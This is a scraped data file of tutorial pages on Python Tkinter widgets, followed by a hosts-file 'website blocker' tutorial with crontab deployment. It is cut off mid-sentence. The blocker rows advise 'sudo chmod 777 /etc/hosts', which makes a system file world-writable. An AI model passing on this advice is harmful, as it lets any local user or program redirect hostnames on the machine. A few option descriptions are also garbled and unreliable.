479,['Python Tkinter Scrollbar '],"['The scrollbar widget is used to scroll down the content of the other widgets like listbox, text, and canvas. However, we can also create the horizontal scrollbars to the Entry widget. ']","['https://www.javatpoint.com/python-tkinter-text', 'https://www.javatpoint.com/python-tkinter-scale', 'https://www.javatpoint.com/python-tkinter-text', 'https://www.javatpoint.com/python-tkinter-scale', 'https://www.javatpoint.com/python-tkinter-text']",['https://static.javatpoint.com/python/images/python-tkinter-scrollbar-output.png'],[],['Methods '],"['Syntax', 'Example']",[],"['The syntax to use the Scrollbar widget is given below. ', 'A list of possible options is given below. ', 'The widget provides the following methods. ']",[],[],"['w = Scrollbar(top, options)', 'from tkinter import *', 'top = Tk()', 'sb = Scrollbar(top)', 'sb.pack(side = RIGHT, fill = Y)', 'mylist = Listbox(top, yscrollcommand = sb.set )', 'for line in range(30):', 'mylist.insert(END, ""Number "" + str(line))', 'mylist.pack( side = LEFT )', 'sb.config( command = mylist.yview )', 'mainloop()']",[],"[""SN|||Option|||Description&&&1|||activebackground|||The background color of the widget when it has the focus.&&&2|||bg|||The background color of the widget.&&&3|||bd|||The border width of the widget. &&&4|||command|||It can be set to the procedure associated with the list which can be called each time when the scrollbar is moved.&&&5|||cursor|||The mouse pointer is changed to the cursor type set to this option which can be an arrow, dot, etc.&&&6|||elementborderwidth|||It represents the border width around the arrow heads and slider. The default value is -1.&&&7|||Highlightbackground|||The focus highlighcolor when the widget doesn't have the focus.&&&8|||highlighcolor|||The focus highlighcolor when the widget has the focus. &&&9|||highlightthickness|||It represents the thickness of the focus highlight.&&&10|||jump|||It is used to control the behavior of the scroll jump. If it set to 1, then the callback is called when the user releases the mouse button.&&&11|||orient|||It can be set to HORIZONTAL or VERTICAL depending upon the orientation of the scrollbar. &&&12|||repeatdelay|||This option tells the duration up to which the button is to be pressed before the slider starts moving in that direction repeatedly. The default is 300 ms.&&&13|||repeatinterval|||The default value of the repeat interval is 100.&&&14|||takefocus|||We can tab the focus through this widget by default. We can set this option to 0 if we don't want this behavior.&&&15|||troughcolor|||It represents the color of the trough. &&&16|||width|||It represents the width of the scrollbar."", 'SN|||Method|||Description&&&1|||get()|||It returns the two numbers a and b which represents the current position of the scrollbar.&&&2|||set(first, last)|||It is used to connect the scrollbar to the other widget w. The yscrollcommand or xscrollcommand of the other widget to this method. ']",[]
480,['Python Tkinter Text '],"['The Text widget is used to show the text data on the Python application. However, Tkinter provides us the Entry widget which is used to implement the single line text box. ']","['https://www.javatpoint.com/python-tkinter-toplevel', 'https://www.javatpoint.com/python-tkinter-scrollbar', 'https://www.javatpoint.com/python-tkinter-toplevel', 'https://www.javatpoint.com/python-tkinter-scrollbar', 'https://www.javatpoint.com/python-tkinter-toplevel']",['https://static.javatpoint.com/python/images/python-tkinter-text-output.png'],[],"['Methods ', 'Mark handling methods ', 'Tag handling methods ']","['Syntax', 'Example']",[],"['The syntax to use the Text widget is given below. ', 'A list of possible options that can be used with the Text widget is given below. ', 'We can use the following methods with the Text widget. ', 'Marks are used to bookmark the specified position between the characters of the associated text. ']","['The Text widget is used to display the multi-line formatted text with various styles and attributes. The Text widget is mostly used to provide the text editor to the user.', 'The Text widget also facilitates us to use the marks and tabs to locate the specific sections of the Text. We can also use the windows and images with the Text as it can also be used to display the formatted text. ', 'The tags are the names given to the separate areas of the text. The tags are used to configure the different areas of the text separately. The list of tag-handling methods along with the description is given below. ']",[],"['w = Text(top, options)', 'from tkinter import *', 'top = Tk()', 'text = Text(top)', 'text.insert(INSERT, ""Name....."")', 'text.insert(END, ""Salary....."")', 'text.pack()', 'text.tag_add(""Write Here"", ""1.0"", ""1.4"")', 'text.tag_add(""Click Here"", ""1.8"", ""1.13"")', 'text.tag_config(""Write Here"", background=""yellow"", foreground=""black"")', 'text.tag_config(""Click Here"", background=""black"", foreground=""white"")', 'top.mainloop()']",[],"[""SN|||Option|||Description&&&1|||bg|||The background color of the widget. &&&2|||bd|||It represents the border width of the widget. &&&3|||cursor|||The mouse pointer is changed to the specified cursor type, i.e. arrow, dot, etc.&&&4|||exportselection|||The selected text is exported to the selection in the window manager. We can set this to 0 if we don't want the text to be exported. &&&5|||font|||The font type of the text.&&&6|||fg|||The text color of the widget.&&&7|||height|||The vertical dimension of the widget in lines. &&&8|||highlightbackground|||The highlightcolor when the widget doesn't has the focus.&&&9|||highlightthickness|||The thickness of the focus highlight. The default value is 1.&&&10|||highlighcolor|||The color of the focus highlight when the widget has the focus. &&&11|||insertbackground|||It represents the color of the insertion cursor. &&&12|||insertborderwidth|||It represents the width of the border around the cursor. The default is 0.&&&13|||insertofftime|||The time amount in Milliseconds during which the insertion cursor is off in the blink cycle. &&&14|||insertontime|||The time amount in Milliseconds during which the insertion cursor is on in the blink cycle. &&&15|||insertwidth|||It represents the width of the insertion cursor. &&&16|||padx|||The horizontal padding of the widget. &&&17|||pady|||The vertical padding of the widget. &&&18|||relief|||The type of the border. The default is SUNKEN. &&&19|||selectbackground|||The background color of the selected text. &&&20|||selectborderwidth|||The width of the border around the selected text. &&&21|||spacing1|||It specifies the amount of vertical space given above each line of the text. The default is 0. &&&22|||spacing2|||This option specifies how much extra vertical space to add between displayed lines of text when a logical line wraps. The default is 0.&&&23|||spacing3|||It specifies the amount of vertical space to insert below each line of the text. &&&24|||state|||It the state is set to DISABLED, the widget becomes unresponsive to the mouse and keyboard unresponsive.&&&25|||tabs|||This option controls how the tab character is used to position the text.&&&26|||width|||It represents the width of the widget in characters.&&&27|||wrap|||This option is used to wrap the wider lines into multiple lines. Set this option to the WORD to wrap the lines after the word that fit into the available space. The default value is CHAR which breaks the line which gets too wider at any character.&&&28|||xscrollcommand|||To make the Text widget horizontally scrollable, we can set this option to the set() method of Scrollbar widget.&&&29|||yscrollcommand|||To make the Text widget vertically scrollable, we can set this option to the set() method of Scrollbar widget. "", 'SN|||Method|||Description&&&1|||delete(startindex, endindex)|||This method is used to delete the characters of the specified range. &&&2|||get(startindex, endindex)|||It returns the characters present in the specified range. &&&3|||index(index)|||It is used to get the absolute index of the specified index. &&&4|||insert(index, string)|||It is used to insert the specified string at the given index. &&&5|||see(index)|||It returns a boolean value true or false depending upon whether the text at the specified index is visible or not. ', 'SN|||Method|||Description&&&1|||index(mark)|||It is used to get the index of the specified mark. &&&2|||mark_gravity(mark, gravity)|||It is used to get the gravity of the given mark. &&&3|||mark_names()|||It is used to get all the marks present in the Text widget. &&&4|||mark_set(mark, index)|||It is used to inform a new position of the given mark.&&&5|||mark_unset(mark)|||It is used to remove the given mark from the text. ', 'SN|||Method|||Description&&&1|||tag_add(tagname, startindex, endindex)|||This method is used to tag the string present in the specified range. &&&2|||tag_config|||This method is used to configure the tag properties. &&&3|||tag_delete(tagname)|||This method is used to delete a given tag.&&&4|||tag_remove(tagname, startindex, endindex)|||This method is used to remove a tag from the specified range. ']",[]
481,['Tkinter Toplevel '],['The Toplevel widget is used to create and display the toplevel windows which are directly managed by the window manager. The toplevel widget may or may not have the parent window on the top of them. '],"['https://www.javatpoint.com/python-tkinter-spinbox', 'https://www.javatpoint.com/python-tkinter-text', 'https://www.javatpoint.com/python-tkinter-spinbox', 'https://www.javatpoint.com/python-tkinter-text', 'https://www.javatpoint.com/python-tkinter-spinbox']",['https://static.javatpoint.com/python/images/python-tkinter-toplevel-output.png'],[],['Methods'],"['Syntax', 'Example']",[],"['The toplevel widget is used when a python application needs to represent some extra information, pop-up, or the group of widgets on the new window. ', 'The toplevel windows have the title bars, borders, and other window decorations.', 'The syntax to use the Toplevel widget is given below. ', 'A List of possible options is given below. ', 'The methods associated with the Toplevel widget is given in the following list. ']",[],[],"['w = Toplevel(options)', 'from tkinter import *', 'root = Tk()', 'root.geometry(""200x200"")', 'def open():', 'top = Toplevel(root)', 'top.mainloop()', 'btn = Button(root, text = ""open"", command = open)', 'btn.place(x=75,y=50)', 'root.mainloop()']",[],"['SN|||Options|||Description&&&1|||bg|||It represents the background color of the window. &&&2|||bd|||It represents the border size of the window.&&&3|||cursor|||The mouse pointer is changed to the cursor type set to the arrow, dot, etc. when the mouse is in the window.&&&4|||class_|||The text selected in the text widget is exported to be selected to the window manager. We can set this to 0 to make this behavior false.&&&5|||font|||The font type of the text inserted into the widget.&&&6|||fg|||The foreground color of the widget. &&&7|||height|||It represents the height of the window.&&&8|||relief|||It represents the type of the window. &&&9|||width|||It represents the width of the window, ', ""SN|||Method|||Description&&&1|||deiconify()|||This method is used to display the window.&&&2|||frame()|||It is used to show a system dependent window identifier.&&&3|||group(window)|||It is used to add this window to the specified window group.&&&4|||iconify()|||It is used to convert the toplevel window into an icon.&&&5|||protocol(name, function)|||It is used to mention a function which will be called for the specific protocol.&&&6|||state()|||It is used to get the current state of the window. Possible values are normal, iconic, withdrawn, and icon.&&&7|||transient([master])|||It is used to convert this window to a transient window (temporary).&&&8|||withdraw()|||It is used to delete the window but doesn't destroy it.&&&9|||maxsize(width, height)|||It is used to declare the maximum size for the window.&&&10|||minsize(width, height)|||It is used to declare the minimum size for the window.&&&11|||positionfrom(who)|||It is used to define the position controller.&&&12|||resizable(width, height)|||It is used to control whether the window can be resizable or not. &&&13|||sizefrom(who)|||It is used to define the size controller.&&&14|||title(string)|||It is used to define the title for the window. ""]",[]
482,['Python Tkinter Spinbox '],"['The Spinbox widget is an alternative to the Entry widget. It provides the range of values to the user, out of which, the user can select the one.']","['https://www.javatpoint.com/python-tkinter-panedwindow', 'https://www.javatpoint.com/python-tkinter-toplevel', 'https://www.javatpoint.com/python-tkinter-panedwindow', 'https://www.javatpoint.com/python-tkinter-toplevel', 'https://www.javatpoint.com/python-tkinter-panedwindow']",['https://static.javatpoint.com/python/images/python-tkinter-spinbox-output.png'],[],['Methods '],"['Syntax', 'Example']",[],"['It is used in the case where a user is given some fixed number of values to choose from. ', 'We can use various options with the Spinbox to decorate the widget. The syntax to use the Spinbox is given below. ', 'A list of possible options is given below. ', 'There are the following methods associated with the widget. ']",[],[],"['w = Spinbox(top, options)', 'from tkinter import *', 'top = Tk()', 'top.geometry(""200x200"")', 'spin = Spinbox(top, from_= 0, to = 25)', 'spin.pack()', 'top.mainloop()']",[],"['SN|||Option|||Description&&&1|||activebackground|||The background color of the widget when it has the focus.&&&2|||bg|||The background color of the widget.&&&3|||bd|||The border width of the widget.&&&4|||command|||The associated callback with the widget which is called each time the state of the widget is called.&&&5|||cursor|||The mouse pointer is changed to the cursor type assigned to this option.&&&6|||disabledbackground|||The background color of the widget when it is disabled.&&&7|||disabledforeground|||The foreground color of the widget when it is disabled.&&&8|||fg|||The normal foreground color of the widget.&&&9|||font|||The font type of the widget content.&&&10|||format|||This option is used for the format string. It has no default value.&&&11|||from_|||It is used to show the starting range of the widget.&&&12|||justify|||It is used to specify the justification of the multi-line widget content. The default is LEFT.&&&13|||relief|||It is used to specify the type of the border. The default is SUNKEN.&&&14|||repeatdelay|||This option is used to control the button auto repeat. The value is given in milliseconds.&&&15|||repeatinterval|||It is similar to repeatdelay. The value is given in milliseconds.&&&16|||state|||It represents the state of the widget. The default is NORMAL. The possible values are NORMAL, DISABLED, or ""readonly"".&&&17|||textvariable|||It is like a control variable which is used to control the behaviour of the widget text.&&&18|||to|||It specify the maximum limit of the widget value. The other is specified by the from_ option.&&&19|||validate|||This option controls how the widget value is validated.&&&20|||validatecommand|||It is associated to the function callback which is used for the validation of the widget content.&&&21|||values|||It represents the tuple containing the values for this widget.&&&22|||vcmd|||It is same as validation command.&&&23|||width|||It represents the width of the widget.&&&24|||wrap|||This option wraps up the up and down button the Spinbox.&&&25|||xscrollcommand|||This options is set to the set() method of scrollbar to make this widget horizontally scrollable. ', ""SN|||Option|||Description&&&1|||delete(startindex, endindex)|||This method is used to delete the characters present at the specified range.&&&2|||get(startindex, endindex)|||It is used to get the characters present in the specified range.&&&3|||identify(x, y)|||It is used to identify the widget's element within the specified range.&&&4|||index(index)|||It is used to get the absolute value of the given index.&&&5|||insert(index, string)|||This method is used to insert the string at the specified index.&&&6|||invoke(element)|||It is used to invoke the callback associated with the widget. ""]",[]
483,['Tkinter PanedWindow'],"['The PanedWindow widget acts like a Container widget which contains one or more child widgets (panes) arranged horizontally or vertically. The child panes can be resized by the user, by moving the separator lines known as sashes by using the mouse.']","['https://www.javatpoint.com/python-tkinter-labelframe', 'https://www.javatpoint.com/python-tkinter-spinbox', 'https://www.javatpoint.com/python-tkinter-labelframe', 'https://www.javatpoint.com/python-tkinter-spinbox', 'https://www.javatpoint.com/python-tkinter-labelframe']",['https://static.javatpoint.com/python/images/python-tkinter-panedwindow-output.png'],[],['Methods '],"['Syntax', 'Example']",[],"['Each pane contains only one widget. The PanedWindow is used to implement the different layouts in the python applications.', 'The syntax to use the PanedWindow is given below. ', 'A list of possible options is given below. ', 'There are the following methods that are associated with the PanedWindow. ']",[],[],"['w= PanedWindow(master, options)', '# !/usr/bin/python3', 'from tkinter import *', 'def add():', 'a = int(e1.get())', 'b = int(e2.get())', 'leftdata = str(a+b)', 'left.insert(1,leftdata)', 'w1 = PanedWindow()', 'w1.pack(fill = BOTH, expand = 1)', 'left = Entry(w1, bd = 5)', 'w1.add(left)', 'w2 = PanedWindow(w1, orient = VERTICAL)', 'w1.add(w2)', 'e1 = Entry(w2)', 'e2 = Entry(w2)', 'w2.add(e1)', 'w2.add(e2)', 'bottom = Button(w2, text = ""Add"", command = add)', 'w2.add(bottom)', 'mainloop()']",[],"[""SN|||Option|||Description&&&1|||bg|||It represents the background color of the widget when it doesn't have the focus.&&&2|||bd|||It represents the 3D border size of the widget. The default option specifies that the trough contains no border whereas the arrowheads and slider contain the 2-pixel border size.&&&3|||borderwidth|||It represents the border width of the widget. The default is 2 pixel.&&&4|||cursor|||The mouse pointer is changed to the specified cursor type when it is over the window.&&&5|||handlepad|||This option represents the distance between the handle and the end of the sash. For the horizontal orientation, it is the distance between the top of the sash and the handle. The default is 8 pixels.&&&6|||handlesize|||It represents the size of the handle. The default size is 8 pixels. However, the handle will always be a square.&&&7|||height|||It represents the height of the widget. If we do not specify the height, it will be calculated by the height of the child window.&&&8 orient The orient will be set to HORIZONTAL if we want to place the child windows side by side. It can be set to VERTICAL if we want to place the child windows from top to bottom.&&&9|||relief|||It represents the type of the border. The default is FLAT.&&&10|||sashpad|||It represents the padding to be done around each sash. The default is 0.&&&11|||sashrelief|||It represents the type of the border around each of the sash. The default is FLAT.&&&12|||sashwidth|||It represents the width of the sash. The default is 2 pixels.&&&13|||showhandle|||It is set to True to display the handles. The default value is false.&&&14|||Width|||It represents the width of the widget. If we don't specify the width of the widget, it will be calculated by the size of the child widgets. "", 'SN|||Method|||Description&&&1|||add(child, options)|||It is used to add a window to the parent window. &&&2|||get(startindex, endindex)|||This method is used to get the text present at the specified range.&&&3|||config(options)|||It is used to configure the widget with the specified options.']",[]
484,['Tkinter LabelFrame'],['The LabelFrame widget is used to draw a border around its child widgets. We can also display the title for the LabelFrame widget. It acts like a container which can be used to group the number of interrelated widgets such as Radiobuttons. '],"['https://www.javatpoint.com/python-tkinter-messagebox', 'https://www.javatpoint.com/python-tkinter-panedwindow', 'https://www.javatpoint.com/python-tkinter-messagebox', 'https://www.javatpoint.com/python-tkinter-panedwindow', 'https://www.javatpoint.com/python-tkinter-messagebox']",['https://static.javatpoint.com/python/images/python-tkinter-labelframe-output.png'],[],[],"['Syntax', 'Example']",[],"['This widget is a variant of the Frame widget which has all the features of a frame. It also can display a label.', 'The syntax to use the LabelFrame widget is given below.', 'A list of options is given below. ']",[],[],"['w = LabelFrame(top, options)', '# !/usr/bin/python3', 'from tkinter import *', 'top = Tk()', 'top.geometry(""300x200"")', 'labelframe1 = LabelFrame(top, text=""Positive Comments"")', 'labelframe1.pack(fill=""both"", expand=""yes"")', 'toplabel = Label(labelframe1, text=""Place to put the positive comments"")', 'toplabel.pack()', 'labelframe2 = LabelFrame(top, text = ""Negative Comments"")', 'labelframe2.pack(fill=""both"", expand = ""yes"")', 'bottomlabel = Label(labelframe2,text = ""Place to put the negative comments"")', 'bottomlabel.pack()', 'top.mainloop()']",[],"[""SN|||Option|||Description&&&1|||bg|||The background color of the widget. &&&2|||bd|||It represents the size of the border shown around the indicator. The default is 2 pixels.&&&3|||Class|||The default value of the class is LabelFrame.&&&4|||colormap|||This option is used to specify which colomap is to be used for this widget. By colormap, we mean the 256 colors that are used to form the graphics. With this option, we can reuse the colormap of another window on this widget. &&&5|||container|||If this is set to true, the LabelFrame becomes the container widget. The default value is false. &&&6|||cursor|||It can be set to a cursor type, i.e. arrow, dot, etc. the mouse pointer is changed to the cursor type when it is over the widget. &&&7|||fg|||It represents the foreground color of the widget. &&&8|||font|||It represents the font type of the widget text.&&&9|||height|||It represents the height of the widget.&&&10|||labelAnchor|||It represents the exact position of the text within the widget. The default is NW(north-west)&&&11|||labelwidget|||It represents the widget to be used for the label. The frame uses the text for the label if no value specified. &&&12|||highlightbackground|||The color of the focus highlight border when the widget doesn't have the focus. &&&13|||highlightcolor|||The color of the focus highlight when the widget has the focus. &&&14|||highlightthickness|||The width of the focus highlight border. &&&15|||padx|||The horizontal padding of the widget. &&&16|||pady|||The vertical padding of the widget. &&&17|||relief|||It represents the border style. The default value is GROOVE. &&&18|||text|||It represents the string containing the label text.&&&19|||width|||It represents the width of the frame. ""]",[]
485,['Tkinter messagebox '],['The messagebox module is used to display the message boxes in the python applications. There are the various functions which are used to display the relevant messages depending upon the application requirements. '],"['https://www.javatpoint.com/python-website-blocker', 'https://www.javatpoint.com/python-tkinter-labelframe', 'https://www.javatpoint.com/python-website-blocker', 'https://www.javatpoint.com/python-tkinter-labelframe', 'https://www.javatpoint.com/python-website-blocker']","['https://static.javatpoint.com/python/images/python-tkinter-messagebox-output1.png', 'https://static.javatpoint.com/python/images/python-tkinter-messagebox-output2.png', 'https://static.javatpoint.com/python/images/python-tkinter-messagebox-output3.png', 'https://static.javatpoint.com/python/images/python-tkinter-messagebox-output4.png', 'https://static.javatpoint.com/python/images/python-tkinter-messagebox-output5.png', 'https://static.javatpoint.com/python/images/python-tkinter-messagebox-output6.png', 'https://static.javatpoint.com/python/images/python-tkinter-messagebox-output7.png']",[],[],"['Syntax', 'Parameters ', '1. showinfo()', 'Example', '2. showwarning()', 'Example', '3. showerror()', 'Example', '4. askquestion()', 'Example', '5. askokcancel()', 'Example', '6. askyesno()', 'Example', '7. askretrycancel()', 'Example']",[],"['The syntax to use the messagebox is given below. ', 'The two options that can be used are default and parent. ', '1. default', 'The default option is used to mention the types of the default button, i.e. ABORT, RETRY, or IGNORE in the message box. ', 'The parent option specifies the parent window on top of which, the message box is to be displayed. ', 'The showinfo() messagebox is used where we need to show some relevant information to the user. ', 'This method is used to display the warning to the user. Consider the following example. ', 'This method is used to display the error message to the user. Consider the following example. ', 'This method is used to ask some question to the user which can be answered in yes or no. Consider the following example. ', ""This method is used to confirm the user's action regarding some application activity. Consider the following example. "", 'This method is used to ask the user about some action to which, the user can answer in yes or no. Consider the following example. ', 'This method is used to ask the user about doing a particular task again or not. Consider the following example. ']",['There is one of the following functions used to show the appropriate message boxes. All the functions are used with the same syntax but have the specific functionalities. '],[],"['messagebox.function_name(title, message [, options])', '# !/usr/bin/python3', 'from tkinter import *', 'from tkinter import messagebox', 'top = Tk()', 'top.geometry(""100x100"")', 'messagebox.showinfo(""information"",""Information"")', 'top.mainloop()', '# !/usr/bin/python3', 'from tkinter import *', 'from tkinter import messagebox', 'top = Tk()', 'top.geometry(""100x100"")', 'messagebox.showwarning(""warning"",""Warning"")', 'top.mainloop()', '# !/usr/bin/python3', 'from tkinter import *', 'from tkinter import messagebox', 'top = Tk()', 'top.geometry(""100x100"")', 'messagebox.showerror(""error"",""Error"")', 'top.mainloop()', '# !/usr/bin/python3', 'from tkinter import *', 'from tkinter import messagebox', 'top = Tk()', 'top.geometry(""100x100"")', 'messagebox.askquestion(""Confirm"",""Are you sure?"")', 'top.mainloop()', '# !/usr/bin/python3', 'from tkinter import *', 'from tkinter import messagebox', 'top = Tk()', 'top.geometry(""100x100"")', 'messagebox.askokcancel(""Redirect"",""Redirecting you to www.javatpoint.com"")', 'top.mainloop()', '# !/usr/bin/python3', 'from tkinter import *', 'from tkinter import messagebox', 'top = Tk()', 'top.geometry(""100x100"")', 'messagebox.askyesno(""Application"",""Got It?"")', 'top.mainloop()', '# !/usr/bin/python3', 'from tkinter import *', 'from tkinter import messagebox', 'top = Tk()', 'top.geometry(""100x100"")', 'messagebox.askretrycancel(""Application"",""try again?"")', 'top.mainloop()']",[],[],['|||function_name: It represents an appropriate message box function.|||title: It is a string which is shown as a title of a message box. |||message: It is the string to be displayed as a message on the message box. |||options: There are various options which can be used to configure the message dialog box. |||']
486,['Introduction'],"['In this section of the tutorial, we are going to build a real-time most popular python application known as website blocker.']","['https://www.javatpoint.com/python-website-blocker-building-python-script', 'https://www.javatpoint.com/python-tkinter-messagebox', 'https://www.javatpoint.com/python-website-blocker-building-python-script', 'https://www.javatpoint.com/python-tkinter-messagebox', 'https://www.javatpoint.com/python-website-blocker-building-python-script']","['https://static.javatpoint.com/python/images/python-website-blocker.png', 'https://static.javatpoint.com/python/images/python-website-blocker2.png', 'https://static.javatpoint.com/python/images/python-website-blocker3.png']",[],"['Objective ', 'Process ', 'Configuration ', 'Requirements ']","['The hosts file ', 'Location of hosts file ']",[],"['This application can be used to block the websites so that the user can not open them during the specific period.', 'The objective of Python website blocker is to block some certain websites which can distract the user during the specified amount of time.', 'The working time in this python application is considered from 9 AM to 5 PM. The time period except that time will be considered as free time. ', 'To block the access to a specific website on the computer, we need to configure the hosts file. ', 'The location of the hosts file varies from operating system to operating system. ', 'Windows: C:\\Windows\\System32\\drivers\\etc', 'mac and Linux: /etc/hosts', 'As we can see in the above image, the mappings are saved for the localhost with the IP address 127.0.0.1.', 'Run the following command on the terminal to change the permissions. ', 'Now add the following line to the file to block the access to facebook.com (for example). ', 'As shown in the image below. ', 'Save the file and try to open the www.facebook.com using the browser. ', 'As shown in the above figure, it is refused to connect. ', 'It needs a python script which keeps adding the necessary lines to the hosts file during a particular period.', 'We need to know the following python modules to build the python website blocker.']","['In this, we will block the access to the list of some particular websites during the working hours so that the user can only access those websites during the free time only. ', ""Since the hosts file contains the mapping between the host names and IP addresses, let's look at the content of our hosts file first stored as /etc/hosts as we use CentOS 7 (Linux). "", 'Similarly, we can redirect any hostname back to the localhost IP (127.0.0.1). It will block the access to that hostname and redirect that to localhost on each request.', ""For testimony, let's edit the content of hosts file and add some of the following lines to it. To make changes to the /etc/hosts file, we will need to change its permissions. "", ""We have completed our task by manually editing the hosts file. We haven't achieved our objective yet. Our objective is to block access to some particular websites (for example, facebook) during working hours only (9 AM to 5 PM)."", ""In this section of the tutorial, we will build such python script which keeps editing the hosts file during the working hours. We will also deploy that script at the OS startup so that it doesn't need any external execution.""]","['The hosts file is a local file which was used to map hostnames to IP addresses in the old days. Although the DNS service is used nowadays to map the hostnames to the IP addresses, the host file is still very complex and can be used to configure the mapping of the IP addresses locally.']","['$ sudo chmod 777 /etc/hosts', '127.0.0.1\t\twww.facebook.com']",[],[],['|||file handling: file handling is used to do the modifications to the hosts file. |||time: The time module is used to control the frequency of the modifications to the hosts file. |||datetime: The datetime module is used to keep track of the free time and working time.|||']
487,['Building python script'],"[""Let's start building the python script that can run at system startup to block the access to the particular websites. Open PyCharm to edit the code or you can use any IDE you want.""]","['https://www.javatpoint.com/python-website-blocker-script-deployment-on-linux', 'https://www.javatpoint.com/python-website-blocker', 'https://www.javatpoint.com/python-website-blocker-script-deployment-on-linux', 'https://www.javatpoint.com/python-website-blocker', 'https://www.javatpoint.com/python-website-blocker-script-deployment-on-linux']","['https://static.javatpoint.com/python/images/building-python-script.png', 'https://static.javatpoint.com/python/images/building-python-script2.png', 'https://static.javatpoint.com/python/images/building-python-script3.png', 'https://static.javatpoint.com/python/images/building-python-script4.png']",[],"['Setting up the variables ', 'Setting up the infinite loop ', 'Determining the time ', 'Writing to the hosts file ', 'Removing from the hosts file ', 'The final script ']",[],[],"['The redirect is assigned to the localhost address, i.e. 127.0.0.1. The websites is a list which contains the website lists that are to be blocked. ', 'We need to have a while loop in the python script to make sure that our script will run at every 5 seconds. ', 'To make this happen, we will use the sleep() method of the time module.', ""Let's discuss more the output of datetime.now()."", 'The script will now contain the following code. ', 'The following code is added to the hosts file.', 'The for loop iterates over the website list (websites) and we will check for each item of the list whether it is already present in the content. ', 'The hosts file will now contain the following python code. ', ""Now, let's run this python script and check whether it has modified the hosts file or not."", ""As we can see, It keeps printing working hours on the console as we are in working hours. Now, let's check the content of the hosts file."", 'As we can see, the two lines have been added to the hosts file. It will redirect the access of Facebook to the localhost.', 'The following code is added to the else part (fun hours case) of the script. ', 'The else part will be executed during the fun hours, and it removes all the mappings that block the access to some specific websites on the computer.', ""Let's check the content of hosts file on the execution of the python script during the fun hours."", 'The script web-blocker.py is given below. ', 'web-blocker.py ']","[""Create a new Python Script named as web-blocker.py. To make the process understandable to you, we will build this script step by step. So let's start coding by setting up all the required variables."", 'This step initializes all the required variables that will be used in the script. Here, the host_path is set to the path to the hosts file. In our case, it is located under /etc. In python, r is used to represent the raw string. ', 'In the process to build our desired python script, we need to check the current time whether it is working time or fun time since the application will block the website access during the working time. ', 'To check the current time, we will use the datetime module. We will check whether the datetime.now() is greater than the datetime object for 9 AM of the current date and is lesser than the datetime object for 5 PM of the current date.', 'The main objective of the script is to keep modifying the hosts file at regular intervals. To let the script configure the hosts file, we need to implement the file handling methods here. ', 'The open() method opens the file stored as host_path in r+ mode. First of all, we read all the content of the file by using the read() method and store it to a variable named content. ', 'If it is present in the hosts file content, then we must pass. Otherwise, we must write the redirect-website mapping to the hosts file so that the website hostname will be redirected to the localhost.', 'Our script is working fine for the working hours, now lets add some features for the fun hours also. In the fun hours (not working hours) we must remove the added lines from the hosts file so that the access to the blocked websites will be granted. ', 'Now, we have a python script which is running fine to block the access of some particular websites during working hours (9 AM to 5 PM) and provide the access during the fun hours. ']","['It returns a datetime object containing current time including year (2019), month(January 1st), date(23rd), time (hour, minutes, seconds). We can compare this value and check whether this value exists between the 9 AM for the current date and 5 PM for a current date using if statement.']","['host_path = r""/etc/hosts""', 'redirect = ""127.0.0.1""', 'websites = [""www.facebook.com"", ""https://www.facebook.com""]', 'import time', 'host_path = r""/etc/hosts""', 'redirect = ""127.0.0.1""', 'websites = [""www.facebook.com"", ""https://www.facebook.com""]', 'while True:', 'time.sleep(5)', 'from time import *', 'from datetime import *', 'host_path = r""/etc/hosts""', 'redirect = ""127.0.0.1""', 'websites = [""www.facebook.com"", ""https://www.facebook.com""]', 'while True:', 'if datetime(datetime.now().year,datetime.now().month,datetime.now().day,9)< datetime.now()< datetime(datetime.now().year,datetime.now().month,datetime.now().day,17):', 'print(""Working hours"")', 'else:', 'print(""Fun hours"")', 'sleep(5)', 'with open(host_path,""r+"") as fileptr:', 'content = fileptr.read()', 'for website in websites:', 'if website in content:', 'pass', 'else:', 'fileptr.write(redirect+""', '""+website+""\\n"")', 'from time import *', 'from datetime import *', 'host_path = r""/etc/hosts""', 'redirect = ""127.0.0.1""', 'websites = [""www.facebook.com"", ""https://www.facebook.com""]', 'while True:', 'if datetime(datetime.now().year,datetime.now().month,datetime.now().day,9)<datetime.now()<datetime(datetime.now().year,datetime.now().month,datetime.now().day,17):', 'print(""working hours"")', 'with open(host_path,""r+"") as fileptr:', 'content = fileptr.read()', 'for website in websites:', 'if website in content:', 'pass', 'else:', 'fileptr.write(redirect+""    ""+website+""\\n"")', 'else:', 'print(""Fun hours"")', 'sleep(5)', ""with open(host_path,'r+') as file:"", 'content = file.readlines();', 'file.seek(0)', 'for line in content:', 'if not any(website in line for website in\t\twebsites):', 'file.write(line)', 'file.truncate()', 'print(""fun hours"")', 'from time import *', 'from datetime import *', 'host_path = r""/etc/hosts""', 'redirect = ""127.0.0.1""', 'websites = [""www.facebook.com"", ""https://www.facebook.com""]', 'while True:', 'if datetime(datetime.now().year,datetime.now().month,datetime.now().day,9)<datetime.now()<datetime(datetime.now().year,datetime.now().month,datetime.now().day,17):', 'with open(host_path,""r+"") as fileptr:', 'content = fileptr.read()', 'for website in websites:', 'if website in content:', 'pass', 'else:', 'fileptr.write(redirect+""    \t""+website+""\\n"")', 'else:', ""with open(host_path,'r+') as file:"", 'content = file.readlines();', 'file.seek(0)', 'for line in content:', 'if not any(website in line for website in \t\t\t\twebsites):', 'file.write(line)', 'file.truncate()', 'sleep(5)']",[],[],[]
488,['Script deployment on Linux'],"['Hence, we are done with the python script (blocker.py) which is running fine. This is the time to deploy this script at system startup.']","['https://www.javatpoint.com/python-website-blocker-script-deployment-on-windows', 'https://www.javatpoint.com/python-website-blocker-building-python-script', 'https://www.javatpoint.com/python-website-blocker-script-deployment-on-windows', 'https://www.javatpoint.com/python-website-blocker-building-python-script', 'https://www.javatpoint.com/python-website-blocker-script-deployment-on-windows']","['https://static.javatpoint.com/python/images/python-website-blocker-script-deployment-on-linux.png', 'https://static.javatpoint.com/python/images/python-website-blocker-script-deployment-on-linux2.png', 'https://static.javatpoint.com/python/images/python-website-blocker-script-deployment-on-linux3.png']",[],['Procedure '],[],[],"['To schedule a script to run at startup on Linux, we need to configure the entry in the crontab schedule. ', 'Follow the following steps.', 'Open the crontab with the -e flag. Run the following command on the terminal on Linux.', 'This will open a crontab file which looks like following. ', 'Now add the following line to the file and save it. ']","['The process to deploy a script to run at startup depends upon the operating system. In this section of the tutorial, we will describe the process for Linux and windows.', 'The crontab can be defined as the list that contains the commands that are to be run on a regular schedule. The crontab stands for cron table which is a set schedule according to which the script is executed on a regular interval.', ""Restart the system now. On reboot, our script blocker.py is scheduled to run at system start-up. As of now, we are in working hours. So let's try to open the Facebook on the browser."", 'As shown in the above image, the website www.facebook.com is refused to connect. Hence, 